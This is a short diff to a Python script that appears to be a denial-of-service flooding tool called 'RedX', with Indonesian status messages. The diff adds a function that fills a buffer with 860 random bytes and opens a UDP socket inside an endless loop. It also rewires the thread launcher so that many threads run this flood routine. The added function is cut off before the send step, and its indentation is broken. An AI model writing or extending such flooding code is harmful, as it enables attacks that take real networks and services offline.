@@ -43,11 +43,17 @@ def run():
                         print("\033[92m [*] RedX Menyenggol ")
                 except:
                         print("\033[94m [!] RedX IS HERE DUDE! ")
-
+def run2():
+        data = random._urandom(860)
+        i = random.choice(("[*]","[!]","[#]"))
+        while True:
+                try:
+                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                         
 for y in range(threads):
         if choice == 'y':
                 th = threading.Thread(target = run)
                 th.start()
-        
-else:
-    print("Password Salah Woe")
+        else:
+                 th = threading.Thread(target = run2)
+                 th.start()
